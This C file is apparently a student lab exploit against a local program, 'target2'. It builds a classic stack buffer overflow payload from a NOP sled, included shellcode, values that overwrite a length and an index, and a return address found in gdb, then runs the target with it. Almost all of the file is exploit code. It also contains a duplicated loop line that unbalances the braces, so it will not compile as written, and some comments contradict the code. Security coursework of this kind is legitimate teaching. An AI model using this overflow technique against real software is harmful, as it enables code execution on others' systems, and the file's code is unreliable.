#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

    /*
	args[0] = TARGET;
	args[1] = "hi there";
	args[2] = NULL;

	env[0] = NULL;
    */
    int i;
    char    buf[284];

	args[0] = TARGET;

    // Pad beginning with 18 NOP's ('\x90')
    // We use 18 because the shellcode is 46 bytes
    // 18+46 = 64 which will keep the buf byte aligned
    for (i = 0 ; i < 83; i++)
        buf[i] = '\x90';

    // Copy shellcode into buf
    for (; i < 128; i++)
        buf[i] = shellcode[i-83];

    // NOPs between shellcode and 
    for (; i < 264; i++)
        buf[i] = '\x90';

    // write '284' to len starting at buf[264]
    for (; i < 268; i = i+4) {
    for (; i < 268; i = i+4) {
        buf[i+3] = '\x90';
        buf[i+2] = '\x90';
        buf[i+1] = '\x01';
        buf[i]   = '\x1c';
    }

    // write '268' to i starting at buf[268]
    for (; i < 272; i = i+4) {
        buf[i+3] = '\x90';
        buf[i+2] = '\x90';
        buf[i+1] = '\x01';
        buf[i]   = '\x0c';
    }

    // Return address of 'buf' is 0x2021fde0
    // (determined by checking gdb)
    for (; i < 284; i = i+4) {
        buf[i+3] = '\x20';
        buf[i+2] = '\x21';
        buf[i+1] = '\xfd';
        buf[i]   = '\xe0';
    }

    args[1] = buf;
	args[2] = NULL;
	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
